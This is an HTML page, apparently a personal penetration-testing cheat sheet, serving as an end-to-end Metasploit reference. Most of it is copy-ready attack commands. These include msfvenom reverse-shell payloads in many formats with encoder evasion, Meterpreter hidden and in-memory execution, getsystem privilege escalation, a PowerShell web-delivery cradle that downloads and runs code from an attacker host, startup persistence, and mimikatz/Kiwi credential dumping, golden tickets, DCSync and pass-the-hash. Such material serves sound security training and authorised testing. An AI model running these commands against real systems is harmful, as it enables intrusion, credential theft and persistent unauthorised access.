@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Metasploit — Corey Clay</title>
+<meta name="description" content="Metasploit reference — install and DB setup, workspaces, module workflow, sessions and jobs, multi/handler, MSFVenom payload matrix, Meterpreter commands, Kiwi, pivoting, bind_tcp over autoroute, resource scripts.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#000000;--ink-2:#121318;--panel:#15171c;--panel-2:#191c22;
+    --line:#262a33;--line-soft:#1b1e24;
+    --fg:#e8eaed;--fg-dim:#b2b6bd;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#9fef00;--signal-soft:rgba(159,239,0,.14);--signal-line:rgba(159,239,0,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-body:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:15px;line-height:1.7;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background-color:var(--ink);background-image:linear-gradient(180deg,transparent 0%,var(--ink) 46%),linear-gradient(var(--line-soft) 1px,transparent 1px),linear-gradient(90deg,var(--line-soft) 1px,transparent 1px),radial-gradient(1100px 520px at 82% -8%,rgba(159,239,0,.05),transparent 60%);background-size:auto,64px 64px,64px 64px,auto;background-position:0 0,-1px -1px,-1px -1px,0 0}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(23,25,31,.97);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(23,25,31,.98);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+
+  .hub{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin:14px 0 10px}
+  @media (max-width:640px){.hub{grid-template-columns:1fr}}
+  .hub-card{display:block;border:1px solid var(--line);border-radius:11px;padding:24px 24px 22px;background:var(--panel);
+    transition:border-color .16s ease,transform .16s ease;position:relative}
+  .hub-card:hover{border-color:var(--signal-line);transform:translateY(-3px)}
+  .hub-card .idx{font-family:var(--f-mono);font-size:12px;color:var(--signal)}
+  .hub-card h3{font-family:var(--f-display);font-weight:600;font-size:21px;color:var(--fg);margin:8px 0 8px;letter-spacing:-.01em}
+  .hub-card p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 0 16px;line-height:1.5}
+  .hub-card .tags{display:flex;flex-wrap:wrap;gap:6px}
+  .hub-card .t{font-family:var(--f-mono);font-size:10.5px;color:var(--fg-dim);background:var(--panel-2);
+    border:1px solid var(--line-soft);padding:3px 8px;border-radius:5px}
+  .hub-card .go{position:absolute;top:22px;right:22px;font-family:var(--f-mono);font-size:16px;color:var(--muted);transition:.16s}
+  .hub-card:hover .go{color:var(--signal);transform:translateX(2px)}
+  .hub-card.soon{opacity:.6;pointer-events:none}
+  .hub-card.soon .go{content:''}
+  .hub-note{font-family:var(--f-mono);font-size:12.5px;color:var(--muted-2);margin-top:26px;border-left:2px solid var(--line);padding-left:16px}
+  .hub-empty{border:1px dashed var(--line);border-radius:12px;padding:52px 30px;text-align:center;margin:14px 0 10px}
+  .hub-empty .ico{font-family:var(--f-mono);font-size:13px;color:var(--signal);margin:0 0 12px}
+  .hub-empty h3{font-family:var(--f-display);font-weight:500;font-size:20px;color:var(--fg);margin:0 0 8px}
+  .hub-empty p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 auto;max-width:46ch;line-height:1.55}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ tools & utilities / metasploit</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a href="methodology.html">methodology</a>
+      <a href="enumeration.html">enumeration</a>
+      <a href="pre-exploitation.html">pre-exploitation</a>
+      <a href="exploitation.html">exploitation</a>
+      <a href="post-exploitation.html">post-exploitation</a>
+      <a class="here" href="tools-utilities.html" aria-current="page">tools &amp; utilities</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="tools-utilities.html">&lsaquo; tools &amp; utilities</a> &nbsp;/&nbsp; // msf-end-to-end</p>
+  <h1>Metasploit</h1>
+  <p>Metasploit end to end — install, DB and workspace setup, module workflow, sessions and jobs, multi/handler, the MSFVenom payload matrix (staged vs stageless, every format), Meterpreter core commands plus channels and execute, getsystem technique legend, Kiwi, pivoting with autoroute + SOCKS, the bind_tcp gotcha for internal targets, resource scripts, and the post-exploitation module cheat sheet.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#installation">Installation</a>
+      <a href="#database-setup">Database Setup</a>
+      <a href="#workspaces">Workspaces</a>
+      <a href="#module-workflow">Module Workflow</a>
+      <a href="#sessions-jobs">Sessions &amp; Jobs</a>
+      <a href="#multi-handler">Multi-Handler</a>
+      <a href="#msfvenom-payload-generation">MSFVenom Payload Generation</a>
+      <a href="#meterpreter-commands">Meterpreter Commands</a>
+      <a href="#meterpreter-advanced">Meterpreter Advanced</a>
+      <a href="#msf-plugins">MSF Plugins</a>
+      <a href="#common-exploits">Common Exploits</a>
+      <a href="#scripting-metasploit">Scripting Metasploit</a>
+      <a href="#multiple-transports">Multiple Transports</a>
+      <a href="#msf-resource-scripts-automation">MSF Resource Scripts (Automation)</a>
+      <a href="#msf-post-exploitation-modules-windows">MSF Post-Exploitation Modules (Windows)</a>
+      <a href="#msf-post-exploitation-modules-linux">MSF Post-Exploitation Modules (Linux)</a>
+      <a href="#msf-pivoting">MSF Pivoting</a>
+      <a href="#msf-persistence-modules">MSF Persistence Modules</a>
+      <a href="#wmap-web-scanner">WMAP Web Scanner</a>
+      <a href="#db-autopwn-plugin">db_autopwn Plugin</a>
+      <a href="#nmap-integration">Nmap Integration</a>
+      <a href="#references">References</a>
+  </div>
+</nav>
+
+<main class="wrap">
+<h2 id="installation">Installation</h2>
+<pre><code class="language-bash">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall
+</code></pre>
+<h2 id="database-setup">Database Setup</h2>
+<pre><code class="language-bash">## Start PostgreSQL
+sudo systemctl start postgresql
+
+## Initialize MSF DB
+sudo msfdb init
+
+## Start msfconsole with DB
+sudo msfdb run
+
+## Check DB status
+msfdb status
+
+## Re-initialize (if broken)
+msfdb reinit
+cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+sudo service postgresql restart
+msfconsole -q
+</code></pre>
+<h3>MSF Database Commands</h3>
+<pre><code>db_status                    # Check connection
+db_nmap -sV -sS &lt;IP&gt;        # Nmap scan → auto-import results
+db_import Target.xml         # Import Nmap XML
+db_export -f xml backup.xml  # Export workspace to XML
+## -f → format (xml | pwdump)
+
+hosts                        # List discovered hosts
+hosts -R                     # Set RHOSTS from results
+services                     # List discovered services
+services -p 445              # Filter by port
+services -p 445 --rhosts     # SET RHOSTS from every host with 445 open (super handy for module runs)
+services -s smb --rhosts     # Same, by service name
+creds                        # List collected credentials
+loot                         # List owned artifacts
+vulns                        # List vulnerabilities
+notes                        # List notes
+</code></pre>
+<p><strong>Global option persistence</strong> (<code>setg</code> / <code>unsetg</code>) — settings survive <code>use &lt;another_module&gt;</code>:</p>
+<pre><code>setg RHOSTS 10.10.10.0/24         # every module now defaults to this range
+setg LHOST tun0
+setg VERBOSE true
+save                              # write globals to ~/.msf4/config so next msfconsole loads them
+
+unsetg RHOSTS                     # remove one
+unsetg all                        # nuke every global
+</code></pre>
+<h2 id="workspaces">Workspaces</h2>
+<pre><code>workspace                    # List workspaces (* = active)
+workspace -a Target_1        # Add workspace
+workspace Target_1           # Switch workspace
+workspace -d Target_1        # Delete workspace
+workspace -D                 # Delete ALL workspaces
+</code></pre>
+<h2 id="module-workflow">Module Workflow</h2>
+<pre><code>search &lt;keyword&gt;             # Search modules
+search rconfig
+search type:exploit platform:windows ms17
+
+use &lt;module&gt;                 # Select module
+use exploit/windows/smb/ms17_010_psexec
+
+show options                 # View required settings
+show targets                 # List supported targets
+show payloads                # List compatible payloads
+show encoders                # List compatible encoders
+
+set RHOSTS &lt;IP&gt;              # Set target
+set LHOST &lt;IP&gt;               # Set listener IP (or tun0)
+set LPORT 4444               # Set listener port
+set payload &lt;index&gt;          # Select payload
+
+info                         # Detailed module info
+
+exploit                      # Run exploit
+exploit -j                   # Run as background job
+
+## Filter payloads:
+grep meterpreter show payloads
+grep meterpreter grep reverse_tcp show payloads
+grep -c meterpreter show payloads  # Count matches
+</code></pre>
+<h2 id="sessions-jobs">Sessions &amp; Jobs</h2>
+<pre><code>## Sessions:
+sessions                     # List active sessions
+sessions -i 1                # Interact with session 1
+sessions -u session_number   # Upgrade session to meterpreter
+sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false
+sessions -c cmd              # Execute a command on several sessions
+sessions -i 10-20 -c &quot;id&quot;    # Execute command on sessions 10-20
+background / bg              # Background current session (or CTRL+Z)
+
+## Jobs:
+jobs -l                      # List running jobs
+jobs -k &lt;id&gt;                 # Kill specific job
+jobs -K                      # Kill ALL jobs
+exploit -j                   # Run exploit as background job
+</code></pre>
+<h2 id="multi-handler">Multi-Handler</h2>
+<p>Catch reverse shells with multi/handler:</p>
+<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST &lt;IP&gt;
+set LPORT 1337
+set ExitOnSession false
+run
+</code></pre>
+<p>Alternatively, use a screen session:</p>
+<pre><code class="language-bash">screen -dRR
+sudo msfconsole
+
+use exploit/multi/handler
+set PAYLOAD generic/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+
+generate -o /tmp/meterpreter.exe -f exe
+to_handler
+
+## [ctrl+a] + [d] to detach
+</code></pre>
+<h2 id="msfvenom-payload-generation">MSFVenom Payload Generation</h2>
+<h3>List Payloads</h3>
+<pre><code class="language-bash">msfvenom -l payloads
+## -l → list (payloads | encoders | formats | platforms)
+</code></pre>
+<h3>Staged vs Stageless Naming</h3>
+<pre><code>## Staged:    windows/meterpreter/reverse_tcp    (/ separates stager+stage)
+## Stageless: windows/meterpreter_reverse_tcp    (_ fused into single payload)
+</code></pre>
+<h3>Generate Meterpreter Payloads</h3>
+<pre><code class="language-bash">## Linux stageless reverse shell
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&quot;&lt;ATTACKER_IP&gt;&quot; LPORT=4242 -f elf &gt; shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=443 -f elf &gt; payload.elf
+
+## Windows stageless reverse shell
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=443 -f exe &gt; payload.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;&lt;ATTACKER_IP&gt;&quot; LPORT=4242 -f exe &gt; shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=443 -f exe -o shell.exe
+
+## Windows Meterpreter Reverse TCP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=443 -f exe &gt; payload.exe
+
+## OS X
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=&quot;&lt;ATTACKER_IP&gt;&quot; LPORT=4242 -f macho &gt; shell.macho
+
+## PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=&quot;&lt;ATTACKER_IP&gt;&quot; LPORT=4242 -f raw &gt; shell.php
+cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
+
+## ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;&lt;ATTACKER_IP&gt;&quot; LPORT=4242 -f asp &gt; shell.asp
+
+## Java JSP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;&lt;ATTACKER_IP&gt;&quot; LPORT=4242 -f raw &gt; shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;&lt;ATTACKER_IP&gt;&quot; LPORT=4242 -f war &gt; shell.war
+
+## Script payloads
+msfvenom -p cmd/unix/reverse_python LHOST=&quot;&lt;ATTACKER_IP&gt;&quot; LPORT=4242 -f raw &gt; shell.py
+msfvenom -p cmd/unix/reverse_bash LHOST=&quot;&lt;ATTACKER_IP&gt;&quot; LPORT=4242 -f raw &gt; shell.sh
+msfvenom -p cmd/unix/reverse_perl LHOST=&quot;&lt;ATTACKER_IP&gt;&quot; LPORT=4242 -f raw &gt; shell.pl
+
+## Alternative formats
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=443 -f dll -o shell.dll
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=443 -f msi -o shell.msi
+msfvenom -p php/reverse_php LHOST=&lt;IP&gt; LPORT=443 -f raw -o shell.php
+</code></pre>
+<h3>ASPX Meterpreter (for IIS upload)</h3>
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=1337 -f aspx &gt; reverse_shell.aspx
+</code></pre>
+<h3>Encoder Options</h3>
+<pre><code class="language-bash">## Single iteration:
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=8080 -e x86/shikata_ga_nai -f exe -o payload.exe
+## -e → encoder; -a → architecture
+
+## 10 iterations:
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o payload.exe
+## -i → iterations
+
+## Bad character removal (auto-selects encoder):
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -b &quot;\x00&quot; -f perl
+## -b → bad characters to avoid
+</code></pre>
+<h3>MSFVenom Flag Reference</h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-p</code></td>
+<td>Payload to use</td>
+</tr>
+<tr>
+<td><code>-f</code></td>
+<td>Output format (elf, exe, aspx, raw, py, war, php, perl, dll, msi)</td>
+</tr>
+<tr>
+<td><code>-o</code></td>
+<td>Output file</td>
+</tr>
+<tr>
+<td><code>-a</code></td>
+<td>Architecture (x86, x64)</td>
+</tr>
+<tr>
+<td><code>--platform</code></td>
+<td>Target platform (windows, linux)</td>
+</tr>
+<tr>
+<td><code>-e</code></td>
+<td>Encoder to use</td>
+</tr>
+<tr>
+<td><code>-i</code></td>
+<td>Encoding iterations</td>
+</tr>
+<tr>
+<td><code>-b</code></td>
+<td>Bad characters to avoid</td>
+</tr>
+<tr>
+<td><code>LHOST</code></td>
+<td>Listener IP</td>
+</tr>
+<tr>
+<td><code>LPORT</code></td>
+<td>Listener port</td>
+</tr>
+</tbody>
+</table>
+<h3>VirusTotal Check</h3>
+<pre><code class="language-bash">msf-virustotal -k &lt;API_KEY&gt; -f payload.exe
+</code></pre>
+<h2 id="meterpreter-commands">Meterpreter Commands</h2>
+<h3>Core Commands</h3>
+<pre><code>getuid                       # Current user
+sysinfo                      # System info
+shell                        # Drop to OS shell
+background / bg              # Background session
+exit / quit                  # Terminate session
+migrate &lt;PID&gt;                # Migrate to another process
+</code></pre>
+<h3>File System Operations</h3>
+<pre><code>pwd                          # Print working directory
+cd &lt;path&gt;                    # Change directory
+ls / dir                     # List files
+cat &lt;file&gt;                   # Read file
+download &lt;file&gt;              # Download file to attacker
+upload &lt;file&gt;                # Upload file to target
+
+## Recursive file search across the whole disk (find files by pattern)
+search -f *.kdbx -d C:\\                     # KeePass DBs anywhere on C:
+search -f &quot;unattend.xml&quot;                     # sysprep leftovers
+search -f &quot;*.config&quot; -d C:\\inetpub\\        # IIS configs
+
+## Local filesystem commands (act on the ATTACKER)
+lpwd                         # Print local working dir
+lcd /home/kali/loot          # Change local dir (where downloads land)
+lcat &lt;local-file&gt;            # cat a local file from meterpreter prompt
+
+## Environment inspection
+getenv PATH USERNAME COMPUTERNAME
+idletime                     # seconds since last user input (proves nobody's watching)
+</code></pre>
+<h3>Meterpreter Channel Management</h3>
+<p>Each shell/process spawned inside a meterpreter session gets its own channel. Juggle them without dropping the session.</p>
+<pre><code>execute -H -i -f cmd.exe     # spawn cmd hidden interactive — this is a channel
+channel -l                   # list open channels
+channel -i &lt;N&gt;               # interact with channel N (switch shells)
+channel -c &lt;N&gt;               # close channel N
+</code></pre>
+<p>Useful when you want a foreground shell AND a background listener from the same meterpreter session.</p>
+<h3><code>execute</code> — Spawn Processes on the Target</h3>
+<pre><code>execute -f notepad.exe                     # visible, foreground
+execute -H -f notepad.exe                  # -H = hidden window
+execute -H -i -f cmd.exe                   # -i = interactive (attach to stdin/stdout)
+execute -H -f payload.exe                  # fire-and-forget silent
+execute -H -f cmd.exe -a &quot;/c whoami&quot;       # -a = arguments
+execute -m -d calc.exe -f /root/wce.exe    # -m = memory-only (in-memory PE loader), -d = process to appear as (calc.exe)
+
+## After spawning, migrate to the new PID for stealth
+ps                                          # find your fresh PID
+migrate &lt;PID&gt;
+</code></pre>
+<p>Flag legend:</p>
+<ul>
+<li><code>-H</code> — hidden window (no visible cmd popup)</li>
+<li><code>-i</code> — interactive channel (see channel management above)</li>
+<li><code>-f &lt;file&gt;</code> — the executable to run</li>
+<li><code>-a "&lt;args&gt;"</code> — command-line arguments</li>
+<li><code>-m</code> — memory-only (RunAsRegularUser reflective load — no disk write)</li>
+<li><code>-d &lt;name&gt;</code> — dummy process name (spoofs the parent-name display)</li>
+<li><code>-c</code> — creates a new console</li>
+<li><code>-w</code> — wait for the process to exit</li>
+</ul>
+<h2 id="meterpreter-advanced">Meterpreter Advanced</h2>
+<h3>Get System Privileges</h3>
+<pre><code>getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre>
+<p><strong><code>getsystem</code> technique legend</strong> — the "via technique N" line means:</p>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>Method</th>
+<th>Requires</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Named Pipe Impersonation (In Memory/Admin)</td>
+<td>Local admin + SeImpersonatePrivilege</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Named Pipe Impersonation (Dropper/Admin)</td>
+<td>Same as 1 but drops binary to disk</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Named Pipe Impersonation (RPCSS variant)</td>
+<td>Local admin</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Token Duplication</td>
+<td>Local admin + SeDebugPrivilege</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Named Pipe Impersonation (PrintSpooler variant)</td>
+<td>Print Spooler service reachable</td>
+</tr>
+</tbody>
+</table>
+<p>If <code>getsystem</code> prints "the requested operation requires elevation", you're not admin -&gt; use a UAC bypass first (e.g. <code>use exploit/windows/local/bypassuac_sdclt</code>) or a privesc exploit.</p>
+<p>Try a specific technique explicitly:</p>
+<pre><code>getsystem -t 1
+</code></pre>
+<h3>Web Delivery</h3>
+<p>Set up a PowerShell web delivery listening on port 8080:</p>
+<pre><code>use exploit/multi/script/web_delivery
+set TARGET 2
+set payload windows/x64/meterpreter/reverse_http
+set LHOST 10.0.0.1
+set LPORT 4444
+run
+</code></pre>
+<p>Then execute on target:</p>
+<pre><code class="language-powershell">powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');
+</code></pre>
+<h3>Persistence with Startup</h3>
+<pre><code>meterpreter &gt; run persistence -U -p 4242
+</code></pre>
+<p><strong>Options</strong>:</p>
+<ul>
+<li><code>-A</code> - Automatically start a matching exploit/multi/handler</li>
+<li><code>-L &lt;opt&gt;</code> - Location in target host to write payload</li>
+<li><code>-P &lt;opt&gt;</code> - Payload to use (default: windows/meterpreter/reverse_tcp)</li>
+<li><code>-S</code> - Start agent on boot as a service (SYSTEM privileges)</li>
+<li><code>-U</code> - Start agent when the user logs on</li>
+<li><code>-X</code> - Start agent when the system boots</li>
+<li><code>-i &lt;opt&gt;</code> - Interval in seconds between connection attempts</li>
+<li><code>-p &lt;opt&gt;</code> - Port on the attacker machine</li>
+<li><code>-r &lt;opt&gt;</code> - IP of the attacker machine listening for the connect back</li>
+</ul>
+<h3>Network Monitoring</h3>
+<pre><code class="language-powershell">## List interfaces
+run packetrecorder -li
+
+## Record interface n°1
+run packetrecorder -i 1
+</code></pre>
+<h3>Port Forwarding</h3>
+<pre><code class="language-powershell">portfwd add -l 7777 -r 172.17.0.2 -p 3006
+</code></pre>
+<h3>Upload / Download</h3>
+<pre><code class="language-powershell">upload /path/in/hdd/payload.exe exploit.exe
+download /path/in/victim
+</code></pre>
+<h3>Execute from Memory</h3>
+<pre><code class="language-powershell">execute -H -i -c -m -d calc.exe -f /root/wce.exe -a -w
+</code></pre>
+<h3>Credential Dumping</h3>
+<pre><code>hashdump                     # Dump password hashes
+</code></pre>
+<h3>Mimikatz Integration</h3>
+<pre><code class="language-powershell">load mimikatz
+mimikatz_command -f version
+mimikatz_command -f samdump::hashes
+mimikatz_command -f sekurlsa::wdigest
+mimikatz_command -f sekurlsa::searchPasswords
+mimikatz_command -f sekurlsa::logonPasswords full
+</code></pre>
+<p>Or use Kiwi (integrated mimikatz):</p>
+<pre><code class="language-powershell">load kiwi
+creds_all
+golden_ticket_create -d &lt;domainname&gt; -k &lt;nthashof krbtgt&gt; -s &lt;SID without le RID&gt; -u &lt;user_for_the_ticket&gt; -t &lt;location_to_store_tck&gt;
+</code></pre>
+<p><strong>Full Kiwi command reference</strong> (subset commonly needed):</p>
+<pre><code>## Individual credential providers (finer-grained than creds_all)
+creds_msv                                  # NTLM + SHA1 from LSASS
+creds_kerberos                             # Kerberos plaintext + tickets
+creds_wdigest                              # Digest auth cleartext
+creds_ssp                                  # Security Support Provider (rare, but has been used)
+
+## LSA / SAM dumps
+lsa_dump_sam                               # Local SAM hashes
+lsa_dump_secrets                           # LSA secrets (DPAPI master keys, service creds)
+
+## Kerberos ticket handling
+kerberos_ticket_list                       # list current tickets in this session
+kerberos_ticket_use &lt;ticket.kirbi&gt;         # pass-the-ticket
+kerberos_ticket_purge                      # nuke all tickets in memory
+
+## DCSync from any privileged session (no need to be on the DC)
+dcsync &lt;DOMAIN\\USER&gt;
+dcsync_ntlm &lt;DOMAIN\\USER&gt;                 # NTLM-only, quieter
+
+## Change a domain user's password (requires DA / delegated rights)
+password_change -n &lt;USER&gt; -p &lt;NEW_PASSWORD&gt;
+
+## Misc
+wifi_list                                  # dump WiFi profiles + PSKs (local machine)
+kiwi_cmd &lt;mimikatz_command&gt;                # run any raw mimikatz command
+</code></pre>
+<h3>Pass the Hash (PSExec)</h3>
+<pre><code class="language-powershell">msf &gt; use exploit/windows/smb/psexec
+msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp
